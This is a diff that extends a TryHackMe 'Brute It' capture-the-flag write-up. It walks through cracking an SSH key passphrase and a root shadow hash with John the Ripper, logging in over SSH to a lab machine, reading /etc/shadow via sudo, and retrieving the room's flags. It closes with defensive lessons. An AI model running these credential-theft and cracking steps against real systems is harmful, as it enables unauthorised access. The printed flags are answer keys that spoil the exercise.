@@ -87,14 +87,70 @@ First Attempt (Slow Output)
 
  ![Hydra Command Execution](/assets/images/brute-it/hydra1.png)
 
-Step 8. **Gained shell access**  
+Step 8. **Logged in as Admin**  
    Logged in successfully and obtained user access to the system.
   
    Flag: THM{brut3_f0rce_is_e4sy}
 
+![Amin Login](/assets/images/brute-it/login-success.png)
 
-   ![Shell Access](/assets/images/brute-it/shell-access.png)
+Step 9. **Cracked the RSA to gain John's sra key**  
+   Copied the RSA private key content and saved it as .txt in my attacker machine.
 
+   ![RSA](/assets/images/brute-it/RSA.png)
+
+   ![Amin Login](/assets/images/brute-it/files.png)
+
+  Commands Used:
+“nano id_rsa”
+“ssh2john id_rsa > hash” to convert it into a crackable hash
+“john --wordlist=/usr/share/wordlists/rockyou.txt --format=SSH hash”
+“john --show hash” to show cracked password
+
+  ![RSA Crack](/assets/images/brute-it/rockinroll.png)
+
+Step 10. **Gained Shell Access**  
+   Successfully obtained user access to the system.
+
+
+Commands:
+“chmod 600 id_rsa”
+“ssh -i id_rsa john@10.10.245.181”
+sudo /bin/cat /etc/shadow | head -n 1
+
+root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7::: = Save this as .txt in kali to get the root password.
+
+“ls”
+“cat user.txt”
+
+ ![Shell](/assets/images/brute-it/root.png)
+ 
+Flag: THM{a_password_is_not_a_barrier}
+Web Flag: THM{brut3_f0rce_is_e4sy}
+
+
+Step 11. **Privillege Escalation**  
+   Checked for sudo privileges:
+
+   Commands:
+   "sudo -l"
+   "sudo cat /root/root.txt"
+   
+ ![Privillege](/assets/images/brute-it/sudo.png)
+
+Step 12. **Root Password**  
+I had saved the above root content as file.txt . I used the 
+
+   Commands:
+"nano file" to check whether the file was present
+"john --wordlist=/usr/share/wordlists/rockyou.txt file" to crack the password
+"john --show file" to show the password
+
+root.txt
+THM{pr1v1l3g3_3sc4l4t10n}
+
+ !Root Password](/assets/images/brute-it/root-password.png)
+ 
 ## 📘 Lessons Learned
 - Account lockout policies are essential  
 - Brute-force protection (e.g., fail2ban, rate-limiting) should be enforced  
